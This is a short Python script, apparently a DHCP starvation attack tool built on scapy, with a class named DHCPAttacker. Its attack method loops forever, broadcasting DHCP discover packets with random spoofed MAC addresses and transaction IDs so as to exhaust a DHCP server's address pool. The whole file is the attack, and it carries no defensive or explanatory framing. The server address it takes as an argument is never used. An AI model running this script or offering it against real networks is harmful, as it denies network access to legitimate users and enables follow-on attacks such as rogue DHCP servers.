from scapy.all import *
import sys

class DHCPAttacker:
    '''
    DHCP Attack
    This class supposes that attacker knows the DHCP server address

    The sniffing function of the DHCP server address will be added later

    '''

    def attack(self, dhcp_server_ip):
        while True:
            xid_random = random.randint(1, 900000000)
            mac_random = str(RandMAC())
            ether_layer = Ether(src=mac_random, dst='ff:ff:ff:ff:ff:ff')
            ip_layer = IP(src='0.0.0.0', dst='255.255.255.255')
            udp_layer = UDP(sport=68, dport=67)
            boot_layer = BOOTP(chaddr=mac_random,xid=xid_random,flags=0x8000)
            dhcp_layer = DHCP(options=[('message-type','discover')])
            packet = ether_layer / ip_layer / udp_layer / boot_layer / dhcp_layer
            send(packet)


if __name__ == "__main__":
    target_ip = sys.argv[1]
    attacker = DHCPAttacker()
    attacker.attack(target_ip)

